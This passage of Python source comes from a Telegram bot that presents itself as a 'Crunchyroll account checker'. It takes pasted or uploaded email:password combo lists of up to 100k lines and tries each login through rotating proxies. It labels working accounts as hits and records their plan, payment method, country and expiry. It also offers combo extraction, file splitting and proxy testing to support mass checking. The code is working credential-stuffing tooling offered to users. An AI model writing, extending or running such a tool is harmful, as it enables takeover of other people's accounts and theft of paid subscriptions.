                return True, result
            error_str = str(result) if result else ""
            if is_transient_error(error_str):
                last_error = error_str
                if attempt < self.post_auth_retries:
                    if "No token" in error_str.lower() or "token" in error_str.lower():
                        token_ok, token_msg = self.get_token()
                        if not token_ok:
                            return False, f"Token refresh failed during retry: {token_msg}"
                    time.sleep(1.5 ** attempt)
                    continue
            return False, result
        return False, f"Retries exhausted: {last_error}"
    def check_account(self):
        d={'email':self.username,'password':self.password,'email_verified':False,'username':self.username,'plan':'Unknown','plan_base':'N/A','country':'Unknown','expiry':'None','auto_renew':False,'max_streams':'0','payment_method':'Unknown','proxy_rotations':self.proxy_rotations,'fail_reason':''}
        s,m=self.get_token()
        if not s:
            d['fail_reason']=m
            return ('PROXY_FAIL' if is_proxy_error(m) else 'FAIL'), d, (self._fmt_proxy_fail(d) if is_proxy_error(m) else self._fmt_fail(d))
        s,m=self._retry_post_auth(self.get_account_info)
        if not s:
            d['fail_reason']=m if isinstance(m,str) else "Account info failed after retries"
            return ('PROXY_FAIL' if is_proxy_error(d['fail_reason']) else 'FAIL'), d, (self._fmt_proxy_fail(d) if is_proxy_error(d['fail_reason']) else self._fmt_fail(d))
        s,info=self._retry_post_auth(self.get_full_account_info)
        if not s:
            d['fail_reason']=info if isinstance(info,str) else "Full account info failed after retries"
            return ('PROXY_FAIL' if is_proxy_error(d['fail_reason']) else 'FAIL'), d, (self._fmt_proxy_fail(d) if is_proxy_error(d['fail_reason']) else self._fmt_fail(d))
        d['email_verified']=info['email_verified']; d['username']=info.get('username',self.username)
        s,benefits=self._retry_post_auth(self.get_benefits)
        if not s:
            d['fail_reason']=benefits if isinstance(benefits,str) else "Benefits check failed after retries"
            if is_proxy_error(d['fail_reason']): return 'PROXY_FAIL',d,self._fmt_proxy_fail(d)
            if "No subscription" in str(d['fail_reason']): return 'FREE',d,self._fmt_free(d)
            return 'FAIL',d,self._fmt_fail(d)
        d['country']=self.translate_country(benefits['country_code']); d['max_streams']=benefits['max_streams']; d['payment_method']=benefits.get('payment_method','Unknown')
        s,sub=self._retry_post_auth(self.get_subscription_v3)
        if not s:
            d['plan']=self.translate_plan(benefits['max_streams'],'unknown'); d['plan_base']='N/A'; d['expiry']='Unknown'; d['auto_renew']=False
        else:
            d['plan']=self.translate_plan(benefits['max_streams'],sub['sku']); d['plan_base']=sub['sku']; d['expiry']=sub['expiry']; d['auto_renew']=sub['auto_renew']
        return 'HIT',d,self._fmt_hit(d)

    # ── Redesigned Result Cards ──────────────────────────────
    def _fmt_hit(self, d):
        rot = f"\n<i>↺ Proxy rotations: {self.proxy_rotations}</i>" if self.proxy_rotations else ""
        acc      = escape_html(f"{d['email']}:{d['password']}")
        plan     = escape_html(d['plan'])
        streams  = escape_html(d['max_streams'])
        billing  = escape_html(d['expiry'])
        auto     = "Yes" if d['auto_renew'] else "No"
        country  = escape_html(d['country'])
        payment  = escape_html(d['payment_method'])
        plan_base= escape_html(d['plan_base'])
        user     = escape_html(d['username'])
        verified = "Yes" if d['email_verified'] else "No"
        return (
            f"{DIV}\n"
            f"  <b>◉  HIT — PREMIUM ACCOUNT</b>\n"
            f"{DIV}\n\n"
            f"<b>▣ Account</b>\n"
            f"<code>{acc}</code>\n\n"
            f"{SDIV}\n"
            f"<b>▸ Status</b>    ➜  Premium (Hit)\n"
            f"<b>▸ Plan</b>      ➜  {plan}\n"
            f"{SDIV}\n"
            f"<b>▸ Streams</b>   ➜  {streams}\n"
            f"<b>▸ Expiry</b>    ➜  {billing}\n"
            f"<b>▸ Renew</b>     ➜  {auto}\n"
            f"<b>▸ Country</b>   ➜  {country}\n"
            f"<b>▸ Payment</b>   ➜  {payment}\n"
            f"<b>▸ Plan Base</b> ➜  {plan_base}\n"
            f"<b>▸ Username</b>  ➜  {user}\n"
            f"<b>▸ Verified</b>  ➜  {verified}\n"
            f"{SDIV}\n"
            f"{rot}"
            f"\n{DIV}\n"
            f"  <i>{COPYRIGHT}</i>\n"
            f"{DIV}"
        )

    def _fmt_free(self, d):
        rot = f"\n<i>↺ Proxy rotations: {self.proxy_rotations}</i>" if self.proxy_rotations else ""
        acc      = escape_html(f"{d['email']}:{d['password']}")
        user     = escape_html(d['username'])
        verified = "Yes" if d['email_verified'] else "No"
        return (
            f"{DIV}\n"
            f"  <b>◌  FREE — NO PREMIUM</b>\n"
            f"{DIV}\n\n"
            f"<b>▣ Account</b>\n"
            f"<code>{acc}</code>\n\n"
            f"{SDIV}\n"
            f"<b>▸ Status</b>    ➜  Free Tier Only\n"
            f"<b>▸ Plan</b>      ➜  No Subscription\n"
            f"<b>▸ Username</b>  ➜  {user}\n"
            f"<b>▸ Verified</b>  ➜  {verified}\n"
            f"{SDIV}\n"
            f"{rot}"
            f"\n{DIV}\n"
            f"  <i>{COPYRIGHT}</i>\n"
            f"{DIV}"
        )

    def _fmt_fail(self, d):
        rot = f"\n<i>↺ Proxy rotations: {self.proxy_rotations}</i>" if self.proxy_rotations else ""
        acc    = escape_html(f"{d['email']}:{d['password']}")
        reason = escape_html(d.get('fail_reason', 'Unknown'))
        return (
            f"{DIV}\n"
            f"  <b>✗  FAIL — INVALID</b>\n"
            f"{DIV}\n\n"
            f"<b>▣ Account</b>\n"
            f"<code>{acc}</code>\n\n"
            f"{SDIV}\n"
            f"<b>▸ Status</b>  ➜  Failed\n"
            f"<b>▸ Reason</b>  ➜  {reason}\n"
            f"{SDIV}\n"
            f"{rot}"
            f"\n{DIV}\n"
            f"  <i>{COPYRIGHT}</i>\n"
            f"{DIV}"
        )

    def _fmt_proxy_fail(self, d):
        rot = f"\n<i>↺ Proxy rotations: {self.proxy_rotations}</i>" if self.proxy_rotations else ""
        acc    = escape_html(f"{d['email']}:{d['password']}")
        reason = escape_html(d.get('fail_reason', 'Unknown'))
        return (
            f"{DIV}\n"
            f"  <b>◇  PROXY FAIL</b>\n"
            f"{DIV}\n\n"
            f"<b>▣ Account</b>\n"
            f"<code>{acc}</code>\n\n"
            f"{SDIV}\n"
            f"<b>▸ Status</b>  ➜  Proxy Error\n"
            f"<b>▸ Reason</b>  ➜  {reason}\n"
            f"{SDIV}\n"
            f"{rot}"
            f"\n{DIV}\n"
            f"  <i>{COPYRIGHT}</i>\n"
            f"{DIV}"
        )

    def fmt_hit_txt(self,d): return f"Account : {d['email']}:{d['password']}\nStatus  : Premium (Hit)\nPlan    : {d['plan']}\nStreams  : {d['max_streams']}\nExpiry  : {d['expiry']}\nRenew   : {'Yes' if d['auto_renew'] else 'No'}\nCountry : {d['country']}\nPayment : {d['payment_method']}\nBase    : {d['plan_base']}\nUser    : {d['username']}\nVerified: {'Yes' if d['email_verified'] else 'No'}"
    def fmt_free_txt(self,d): return f"Account : {d['email']}:{d['password']}\nStatus  : Free Tier\nPlan    : No Subscription\nUser    : {d['username']}\nVerified: {'Yes' if d['email_verified'] else 'No'}"
    def fmt_fail_txt(self,d): return f"Account : {d['email']}:{d['password']}\nStatus  : Failed\nReason  : {d.get('fail_reason','Unknown')}"
    def fmt_proxy_fail_txt(self,d): return f"Account : {d['email']}:{d['password']}\nStatus  : Proxy Fail\nReason  : {d.get('fail_reason','Unknown')}"

# ── Bot handlers ─────────────────────────────────────────────
async def error_handler(update, ctx):
    tb = "".join(traceback.format_exception(None, ctx.error, ctx.error.__traceback__))
    logger.error(f"Update error: {tb}")
    if update and hasattr(update, 'effective_message') and update.effective_message:
        try:
            await safe_reply_text(update.effective_message,
                f"{DIV}\n"
                f"  <b>✗  Error Occurred</b>\n"
                f"{DIV}\n\n"
                f"<b>▸</b> Something went wrong. Please try again.\n\n"
                f"{DIV}"
            )
        except Exception:
            pass

async def check_channel_membership(uid, ctx):
    if uid in admin_ids: return True
    try: return (await ctx.bot.get_chat_member(CHANNEL_ID, uid)).status in ['member','administrator','creator']
    except: return False

async def send_join_required(update, ctx):
    # Telegram best practice: URL buttons for external links, callback for internal actions
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("▸  Join Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("↺  I've Joined — Retry", callback_data="retry_join")]
    ])
    msg = (
        f"{DIV}\n"
        f"  <b>◈  ACCESS RESTRICTED</b>\n"
        f"{DIV}\n\n"
        f"<b>▸</b> You must join our channel to use this bot.\n\n"
        f"<b>▸</b> Click <b>Join Channel</b> below, then tap\n"
        f"   <b>I've Joined — Retry</b> to continue.\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(msg, reply_markup=kb, parse_mode=ParseMode.HTML)
    else:
        await _reply(update, msg, reply_markup=kb)

async def send_custom_message(bot, chat_id):
    if CUSTOM_MESSAGE is None:
        await safe_send_message(bot, chat_id,
            f"{DIV}\n"
            f"  <b>◧  MAINTENANCE</b>\n"
            f"{DIV}\n\n"
            f"<b>▸</b> Bot is currently under maintenance.\n"
            f"<b>▸</b> Please try again later.\n\n"
            f"{DIV}\n"
            f"  <i>{COPYRIGHT}</i>\n"
            f"{DIV}"
        )
        return
    msg_type = CUSTOM_MESSAGE.get('type')
    if msg_type == 'text':
        await safe_send_message(bot, chat_id, CUSTOM_MESSAGE['text'])
    elif msg_type == 'photo':
        await safe_send_photo(bot, chat_id, CUSTOM_MESSAGE['file_id'], caption=CUSTOM_MESSAGE.get('caption'))
    elif msg_type == 'video':
        await safe_send_video(bot, chat_id, CUSTOM_MESSAGE['file_id'], caption=CUSTOM_MESSAGE.get('caption'))
    elif msg_type == 'document':
        await safe_send_document(bot, chat_id, CUSTOM_MESSAGE['file_id'], caption=CUSTOM_MESSAGE.get('caption'))
    elif msg_type == 'audio':
        await safe_send_audio(bot, chat_id, CUSTOM_MESSAGE['file_id'], caption=CUSTOM_MESSAGE.get('caption'))
    elif msg_type == 'voice':
        await safe_send_voice(bot, chat_id, CUSTOM_MESSAGE['file_id'])
    elif msg_type == 'sticker':
        await safe_send_sticker(bot, chat_id, CUSTOM_MESSAGE['file_id'])
    else:
        await safe_send_message(bot, chat_id,
            f"{DIV}\n  <b>◧  MAINTENANCE</b>\n{DIV}\n\n"
            f"<b>▸</b> Bot is under maintenance. Try again later.\n\n"
            f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
        )

def require_channel(func):
    async def wrapper(update, ctx):
        uid = update.effective_user.id
        if uid in admin_ids:
            return await func(update, ctx)
        if not BOT_ENABLED:
            if update.callback_query:
                await update.callback_query.answer("Bot is currently offline.", show_alert=True)
            else:
                await send_custom_message(ctx.bot, update.effective_chat.id)
            return
        if not await check_channel_membership(uid, ctx):
            await send_join_required(update, ctx)
            return
        return await func(update, ctx)
    return wrapper

def is_user_check_busy(uid: int) -> bool:
    if user_bulk_active.get(uid):
        return True
    pending_ts = user_pending_detect.get(uid)
    if pending_ts and (time.time() - pending_ts) < PENDING_DETECT_TIMEOUT:
        return True
    return False

# ── START / MAIN MENU ────────────────────────────────────────
@require_channel
async def start(update, ctx):
    uid = update.effective_user.id
    ensure_user_in_db(uid, update.effective_user.username or update.effective_user.first_name or str(uid))
    name = escape_html(update.effective_user.first_name or "User")

    # Telegram best practice: group related actions in rows, max 2 per row for readability
    kb_rows = [
        [InlineKeyboardButton("◉  Crunchyroll Checker", callback_data="checker_crunchyroll")],
        [
            InlineKeyboardButton("◈  Proxy",  callback_data="proxy_menu"),
            InlineKeyboardButton("◧  Tools",  callback_data="tools_menu"),
        ],
        [InlineKeyboardButton("◑  My Profile", callback_data="my_profile")],
    ]
    if uid == OWNER_ID:
        kb_rows.append([InlineKeyboardButton("◆  Owner Panel", callback_data="owner_panel")])

    kb = InlineKeyboardMarkup(kb_rows)
    msg = (
        f"{DIV}\n"
        f"  <b>◈  CRUNCHYROLL CHECKER</b>\n"
        f"{DIV}\n\n"
        f"<b>▸</b> Welcome, <b>{name}</b>\n\n"
        f"<b>▸</b> High-speed Crunchyroll account checker\n"
        f"<b>▸</b> Fast · Reliable · Free for everyone\n\n"
        f"{SDIV}\n"
        f"<b>▸</b> Select an option from the menu below\n"
        f"{SDIV}\n\n"
        f"<i>{COPYRIGHT}</i>"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(msg, reply_markup=kb, parse_mode=ParseMode.HTML)
    else:
        await _reply(update, msg, reply_markup=kb)

# ── OWNER PANEL ──────────────────────────────────────────────
async def owner_panel_callback(update, ctx):
    q = update.callback_query
    if q.from_user.id != OWNER_ID:
        await q.answer("Access denied.", show_alert=True)
        return
    await q.answer()
    text = (
        f"{DIV}\n"
        f"  <b>◆  OWNER PANEL</b>\n"
        f"{DIV}\n\n"
        f"<b>▸ Bot Control</b>\n"
        f"  <code>/adminbotoff</code>  ➜  Turn bot off\n"
        f"  <code>/adminboton</code>   ➜  Turn bot on\n"
        f"  <code>/customadmin</code>  ➜  Set offline message\n\n"
        f"{SDIV}\n"
        f"<b>▸ Broadcast</b>\n"
        f"  <code>/broadcast</code>    ➜  Message all users\n\n"
        f"{SDIV}\n"
        f"<b>▸ Proxy Admin</b>\n"
        f"  <code>/setadminproxy</code> ➜  Set admin proxies\n"
        f"  <code>/deladminproxy</code> ➜  Remove admin proxies\n\n"
        f"{SDIV}\n"
        f"<b>▸ Tools</b>\n"
        f"  <code>/split</code>  <code>/filter</code>  <code>/stats</code>\n"
        f"  <code>/setproxy</code>  <code>/delproxy</code>  <code>/myproxy</code>\n\n"
        f"{SDIV}\n"
        f"<b>▣ Owner ID</b>  ➜  <code>{OWNER_ID}</code>\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("◂  Back", callback_data="back_to_main")]])
    await q.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)

# ── MY PROFILE ───────────────────────────────────────────────
async def my_profile_callback(update, ctx):
    q = update.callback_query
    await q.answer()
    user = q.from_user
    uid = user.id
    data = load_user_from_db(uid)
    personal_px = len(user_proxies.get(uid, []))
    admin_px = bool(get_admin_proxies())

    total   = data['total_checked'] if data else 0
    hits    = data['total_hits']    if data else 0
    frees   = data['total_free']    if data else 0
    fails   = data['total_fail']    if data else 0
    pfails  = data['total_proxy_fail'] if data else 0

    proxy_status = f"{personal_px} personal" if personal_px else ("Admin proxy active" if admin_px else "None set")

    profile = (
        f"{DIV}\n"
        f"  <b>◑  MY PROFILE</b>\n"
        f"{DIV}\n\n"
        f"<b>▸ Name</b>      ➜  {escape_html(user.full_name)}\n"
        f"<b>▸ Username</b>  ➜  {'@' + escape_html(user.username) if user.username else 'N/A'}\n"
        f"<b>▸ User ID</b>   ➜  <code>{user.id}</code>\n\n"
        f"{SDIV}\n"
        f"<b>▸ Checked</b>   ➜  {total}\n"
        f"<b>▸ Hits</b>      ➜  {hits}\n"
        f"<b>▸ Free</b>      ➜  {frees}\n"
        f"<b>▸ Fails</b>     ➜  {fails}\n"
        f"<b>▸ PxyFail</b>   ➜  {pfails}\n\n"
        f"{SDIV}\n"
        f"<b>▸ Proxy</b>     ➜  {proxy_status}\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("◂  Back", callback_data="back_to_main")]])
    await q.edit_message_text(profile, reply_markup=kb, parse_mode=ParseMode.HTML)

# ── TOOLS MENU ───────────────────────────────────────────────
async def tools_menu_callback(update, ctx):
    q = update.callback_query
    await q.answer()
    msg = (
        f"{DIV}\n"
        f"  <b>◧  TOOLS</b>\n"
        f"{DIV}\n\n"
        f"<b>▸ Filter</b>\n"
        f"  <code>/filter</code>  ➜  Extract unique email:pass from text or file\n\n"
        f"<b>▸ Split</b>\n"
        f"  <code>/split [size]</code>  ➜  Split .txt file into chunks\n\n"
        f"{SDIV}\n"
        f"<b>▸</b> Reply to a <code>.txt</code> file or message with the command.\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("◂  Back", callback_data="back_to_main")]])
    await q.edit_message_text(msg, reply_markup=kb, parse_mode=ParseMode.HTML)

# ── CRUNCHYROLL CHECKER MENU ─────────────────────────────────
async def checker_crunchyroll_callback(update, ctx):
    q = update.callback_query
    await q.answer()
    # Telegram tip: use URL buttons only for external links; callback for all in-bot actions
    # One button per row for command-info buttons keeps it clean and readable
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("◎  Single Check  (/check)",   callback_data="cr_cmd_check")],
        [InlineKeyboardButton("▦  Mass Check    (/mcheck)",  callback_data="cr_cmd_mass")],
        [InlineKeyboardButton("▤  Bulk Check    (/bulk)",    callback_data="cr_cmd_bulk")],
        [InlineKeyboardButton("■  Stop Checking (/stop)",    callback_data="cr_cmd_stop")],
        [InlineKeyboardButton("◂  Back",                     callback_data="back_to_main")],
    ])
    await q.edit_message_text(
        f"{DIV}\n"
        f"  <b>◉  CRUNCHYROLL CHECKER</b>\n"
        f"{DIV}\n\n"
        f"<b>▸ Single</b>  ➜  <code>/check email:pass</code>\n"
        f"<b>▸ Mass</b>    ➜  <code>/mcheck ...</code>  (max {MAX_MASS_CHECK})\n"
        f"<b>▸ Bulk</b>    ➜  Reply to <code>.txt</code> with <code>/bulk</code>  (up to 100k)\n\n"
        f"{SDIV}\n"
        f"<b>▸</b> Or simply <b>send a .txt file</b> / <b>paste combos</b>\n"
        f"   and the bot will auto-detect them.\n\n"
        f"<b>▸</b> Set your proxy first with <code>/setproxy</code>\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}",
        reply_markup=kb, parse_mode=ParseMode.HTML
    )

# ── PROXY MENU ───────────────────────────────────────────────
async def proxy_menu_callback(update, ctx):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    personal = user_proxies.get(uid, [])
    admin = get_admin_proxies()

    px_status = f"{len(personal)} personal proxies loaded" if personal else "No personal proxies"
    admin_status = "Admin proxy active (shared)" if admin else "No admin proxy"

    msg = (
        f"{DIV}\n"
        f"  <b>◈  PROXY SETTINGS</b>\n"
        f"{DIV}\n\n"
        f"<b>▸ Personal</b>  ➜  {px_status}\n"
        f"<b>▸ Admin</b>     ➜  {admin_status}\n\n"
        f"{SDIV}\n"
        f"<b>▸</b> <code>/setproxy</code>  ➜  Add proxies\n"
        f"<b>▸</b> <code>/delproxy</code>  ➜  Remove proxies\n"
        f"<b>▸</b> <code>/myproxy</code>   ➜  View your proxies\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("◈  Test Proxy", callback_data="test_proxy")],
        [InlineKeyboardButton("◂  Back",       callback_data="back_to_main")],
    ])
    await q.edit_message_text(msg, reply_markup=kb, parse_mode=ParseMode.HTML)

# ── PROXY TEST / PURGE ───────────────────────────────────────
async def _test_and_purge_personal_proxies(uid, ctx, message):
    personal = user_proxies.get(uid, [])
    if not personal:
        return (
            f"{DIV}\n  <b>◈  PROXY TEST</b>\n{DIV}\n\n"
            f"<b>▸</b> No personal proxies to test.\n\n"
            f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
        )

    working = []
    failed  = []
    total   = len(personal)
    sem     = asyncio.Semaphore(PROXY_TEST_CONCURRENCY)
    tested  = 0
    lock    = asyncio.Lock()
    last_ui_update = 0
    last_db_save   = time.monotonic()
    db_save_count  = 0

    async def maybe_update_ui(force=False):
        nonlocal last_ui_update
        now = time.monotonic()
        if force or now - last_ui_update >= PROXY_UI_UPDATE_INTERVAL:
            try:
                await safe_edit_message_text(ctx.bot, message.chat_id, message.message_id,
                    f"{DIV}\n  <b>◈  TESTING PROXIES</b>\n{DIV}\n\n"
                    f"<b>▸ Tested</b>   ➜  {tested} / {total}\n"
                    f"<b>▸ Working</b>  ➜  {len(working)}\n"
                    f"<b>▸ Failed</b>   ➜  {len(failed)}\n\n"
                    f"{DIV}"
                )
                last_ui_update = now
            except Exception:
                pass

    async def maybe_save_db():
        nonlocal last_db_save, db_save_count
        now = time.monotonic()
        if (db_save_count >= PROXY_DB_SAVE_BATCH) or (now - last_db_save >= PROXY_DB_SAVE_INTERVAL):
            save_user_proxies(uid, working)
            last_db_save = now
            db_save_count = 0

    async def test_one(proxy_url):
        nonlocal tested, db_save_count
        async with sem:
            ok = await test_proxy_health(proxy_url)
            async with lock:
                tested += 1
                if ok:
                    working.append(proxy_url)
                else:
                    failed.append(proxy_url)
                db_save_count += 1
                await maybe_update_ui()
                await maybe_save_db()

    tasks = [asyncio.create_task(test_one(p)) for p in personal]
    await asyncio.gather(*tasks)

    user_proxies[uid] = working
    save_user_proxies(uid, working)
    await maybe_update_ui(force=True)

    removed_lines = ""
    if failed:
        removed_lines = "".join(
            f"  <code>{escape_html(mask_proxy(fp))}</code>\n" for fp in failed[:10]
        )
        if len(failed) > 10:
            removed_lines += f"  <i>... and {len(failed)-10} more</i>\n"

    no_proxy_note = "\n<b>▲</b> No working proxies remaining." if not working else ""

    return (
        f"{DIV}\n"
        f"  <b>◈  PROXY TEST RESULTS</b>\n"
        f"{DIV}\n\n"
        f"<b>▸ Working</b>  ➜  {len(working)}\n"
        f"<b>▸ Removed</b>  ➜  {len(failed)}\n"
        f"{SDIV}\n"
        f"{removed_lines}"
        f"{no_proxy_note}\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}"
    )

async def test_proxy_callback(update, ctx):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    personal = user_proxies.get(uid, [])
    admin = get_admin_proxies()

    if personal:
        await q.edit_message_text(
            f"{DIV}\n  <b>◈  TESTING PROXIES</b>\n{DIV}\n\n"
            f"<b>▸</b> Please wait…\n\n{DIV}"
        )
        result = await _test_and_purge_personal_proxies(uid, ctx, q.message)
        await q.edit_message_text(result, parse_mode=ParseMode.HTML)
    elif admin:
        proxy_url = admin[0]
        await q.edit_message_text(
            f"{DIV}\n  <b>◈  TESTING ADMIN PROXY</b>\n{DIV}\n\n"
            f"<b>▸</b> Please wait…\n\n{DIV}"
        )
        ok = await test_proxy_health(proxy_url)
        if not ok:
            await q.edit_message_text(
                f"{DIV}\n  <b>◈  PROXY TEST</b>\n{DIV}\n\n"
                f"<b>▸</b> Admin proxy test failed.\n\n{DIV}"
            )
            return
        exit_ip = await fetch_exit_ip(proxy_url)
        ip_line = f"<b>▸ Exit IP</b>  ➜  <code>{escape_html(exit_ip)}</code>" if exit_ip else "<b>▸</b> Could not fetch exit IP."
        await q.edit_message_text(
            f"{DIV}\n  <b>◈  PROXY TEST</b>\n{DIV}\n\n"
            f"<b>▸ Status</b>  ➜  Working\n"
            f"{ip_line}\n\n"
            f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}",
            parse_mode=ParseMode.HTML
        )
    else:
        await q.edit_message_text(
            f"{DIV}\n  <b>◈  PROXY TEST</b>\n{DIV}\n\n"
            f"<b>▸</b> No proxy to test.\n\n{DIV}"
        )

@require_channel
async def myproxy_cmd(update, ctx):
    uid = update.effective_user.id
    personal = user_proxies.get(uid, [])
    admin = get_admin_proxies()
    if not personal and not admin:
        await _reply(update,
            f"{DIV}\n  <b>◈  MY PROXIES</b>\n{DIV}\n\n"
            f"<b>▸</b> No proxy set.\n"
            f"<b>▸</b> Use <code>/setproxy</code> to add one.\n\n"
            f"{DIV}"
        )
        return

    personal_lines = ""
    if personal:
        personal_lines = "\n".join(
            f"  <code>{escape_html(mask_proxy(p))}</code>" for p in personal[:10]
        )
        if len(personal) > 10:
            personal_lines += f"\n  <i>... and {len(personal)-10} more</i>"

    admin_line = f"\n<b>▸ Admin</b>  ➜  Active (shared)" if admin else ""

    msg = (
        f"{DIV}\n"
        f"  <b>◈  MY PROXIES</b>\n"
        f"{DIV}\n\n"
        f"<b>▸ Personal</b>  ➜  {len(personal)} loaded\n"
        f"{personal_lines}\n"
        f"{admin_line}\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("◈  Test Proxy", callback_data=f"test_myproxy_{uid}")],
        [InlineKeyboardButton("◂  Back",       callback_data="back_to_main")],
    ])
    if update.callback_query:
        await update.callback_query.edit_message_text(msg, reply_markup=kb, parse_mode=ParseMode.HTML)
    else:
        await _reply(update, msg, reply_markup=kb)

async def myproxy_test_callback(update, ctx):
    q = update.callback_query
    await q.answer()
    data = q.data.split("_")
    if len(data) < 3: return
    uid = int(data[2])
    personal = user_proxies.get(uid, [])
    admin = get_admin_proxies()

    if personal:
        await q.edit_message_text(
            f"{DIV}\n  <b>◈  TESTING PROXIES</b>\n{DIV}\n\n"
            f"<b>▸</b> Please wait…\n\n{DIV}"
        )
        result = await _test_and_purge_personal_proxies(uid, ctx, q.message)
        await q.edit_message_text(result, parse_mode=ParseMode.HTML)
    elif admin:
        proxy_url = admin[0]
        await q.edit_message_text(
            f"{DIV}\n  <b>◈  TESTING ADMIN PROXY</b>\n{DIV}\n\n"
            f"<b>▸</b> Please wait…\n\n{DIV}"
        )
        ok = await test_proxy_health(proxy_url)
        if not ok:
            await q.edit_message_text(
                f"{DIV}\n  <b>◈  PROXY TEST</b>\n{DIV}\n\n"
                f"<b>▸</b> Admin proxy test failed.\n\n{DIV}"
            )
            return
        exit_ip = await fetch_exit_ip(proxy_url)
        ip_line = f"<b>▸ Exit IP</b>  ➜  <code>{escape_html(exit_ip)}</code>" if exit_ip else "<b>▸</b> Could not fetch exit IP."
        await q.edit_message_text(
            f"{DIV}\n  <b>◈  PROXY TEST</b>\n{DIV}\n\n"
            f"<b>▸ Status</b>  ➜  Working\n"
            f"{ip_line}\n\n"
            f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}",
            parse_mode=ParseMode.HTML
        )
    else:
        await q.edit_message_text(
            f"{DIV}\n  <b>◈  PROXY TEST</b>\n{DIV}\n\n"
            f"<b>▸</b> No proxy to test.\n\n{DIV}"
        )

# ── AUTO DETECT COMBOS ───────────────────────────────────────
async def auto_detect_combos(update, ctx):
    if not BOT_ENABLED:
        if update.message:
            await send_custom_message(ctx.bot, update.effective_chat.id)
        return
    if update.message and update.message.text and update.message.text.startswith('/'):
        return
    uid = update.effective_user.id
    if not await check_channel_membership(uid, ctx):
        return

    if user_bulk_active.get(uid):
        await safe_reply_text(update.message,
            f"{DIV}\n  <b>▲  BUSY</b>\n{DIV}\n\n"
            f"<b>▸</b> You already have an active check running.\n"
            f"<b>▸</b> Use <code>/stop</code> to cancel it first.\n\n{DIV}"
        )
        return

    user_pending_detect[uid] = time.time()

    combos = []
    download_error = False
    if update.message.document and update.message.document.file_name.lower().endswith('.txt'):
        try:
            content = await download_file_with_retries(ctx, update.message.document.file_id, timeout=600)
            combos = extract_combos(content)
        except Exception as e:
            logger.error(f"Download error in auto_detect: {e}")
            download_error = True
    elif update.message.text:
        combos = extract_combos(update.message.text)
    else:
        download_error = True

    if download_error or not combos:
        user_pending_detect.pop(uid, None)
        if download_error:
            await safe_reply_text(update.message,
                f"{DIV}\n  <b>✗  DOWNLOAD ERROR</b>\n{DIV}\n\n"
                f"<b>▸</b> Could not download file. Please try again.\n\n{DIV}"
            )
        return

    unique = list(dict.fromkeys(combos))
    if uid not in admin_ids and len(unique) > MAX_BULK_LINES:
        user_pending_detect.pop(uid, None)
        await safe_reply_text(update.message,
            f"{DIV}\n  <b>▲  FILE TOO LARGE</b>\n{DIV}\n\n"
            f"<b>▸ Found</b>    ➜  {len(unique)} combos\n"
            f"<b>▸ Allowed</b>  ➜  {MAX_BULK_LINES} max\n\n"
            f"<b>▸</b> Use <code>/split {MAX_BULK_LINES}</code> to split into chunks.\n\n{DIV}"
        )
        return

    count = len(unique)
    callback_id = str(uuid.uuid4())
    pending_bulk[callback_id] = (unique, uid)

    # Telegram tip: single prominent action button for auto-detected content
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"▶  Check {count} Combos", callback_data=f"auto_bulk_{callback_id}")]
    ])

    await safe_reply_text(update.message,
        f"{DIV}\n"
        f"  <b>◎  COMBO FILE DETECTED</b>\n"
        f"{DIV}\n\n"
        f"<b>▸ Found</b>   ➜  <b>{count}</b> valid combos\n"
        f"<b>▸ Dupes</b>   ➜  Removed automatically\n\n"
        f"{SDIV}\n"
        f"<b>▸</b> Tap the button below to start checking.\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}",
        reply_markup=kb, parse_mode=ParseMode.HTML
    )

async def auto_bulk_callback(update, ctx):
    q = update.callback_query
    await q.answer()
    parts = q.data.split("_", 2)
    if len(parts) < 3:
        await q.edit_message_text(f"{DIV}\n  <b>✗  Error</b>\n{DIV}\n\n<b>▸</b> Invalid request.\n\n{DIV}")
        return
    _, _, callback_id = parts
    data = pending_bulk.pop(callback_id, None)
    if not data:
        await q.edit_message_text(
            f"{DIV}\n  <b>▲  EXPIRED</b>\n{DIV}\n\n"
            f"<b>▸</b> This check session has expired.\n"
            f"<b>▸</b> Please send your combos again.\n\n{DIV}"
        )
        return
    combos, user_id = data
    uid = q.from_user.id
    if uid != user_id:
        await q.answer("This request is not for you.", show_alert=True)
        return

    user_pending_detect.pop(uid, None)

    if user_bulk_active.get(uid):
        await q.edit_message_text(
            f"{DIV}\n  <b>▲  BUSY</b>\n{DIV}\n\n"
            f"<b>▸</b> You already have an active check.\n"
            f"<b>▸</b> Use <code>/stop</code> to cancel it first.\n\n{DIV}"
        )
        return

    await q.edit_message_text(
        f"{DIV}\n  <b>◎  STARTING CHECK</b>\n{DIV}\n\n"
        f"<b>▸</b> Please wait…\n\n{DIV}"
    )
